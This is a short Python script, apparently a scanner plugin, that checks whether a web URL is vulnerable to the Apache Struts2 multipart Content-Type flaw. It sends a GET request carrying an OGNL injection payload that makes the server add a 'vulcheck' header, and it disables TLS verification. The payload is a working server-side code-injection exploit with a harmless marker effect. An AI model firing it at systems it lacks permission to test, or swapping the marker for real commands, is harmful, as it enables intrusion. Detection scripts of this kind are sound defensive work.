import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def check(cls, msg):
    action_url = msg
    _files = {'img': ('say.txt', 'xxxxx')}
    _headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
        'Content-Type': "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulcheck', 'ok')}.multipart/form-data"
    }
    response = requests.get(action_url, headers=_headers, files=_files, verify=False, timeout=5)
    if 'vulcheck' in response.headers:
        # cls.consumer_channel.put('{} is vulnerable!!!'.format(action_url))
        print('{} is vulnerable!!!'.format(action_url))
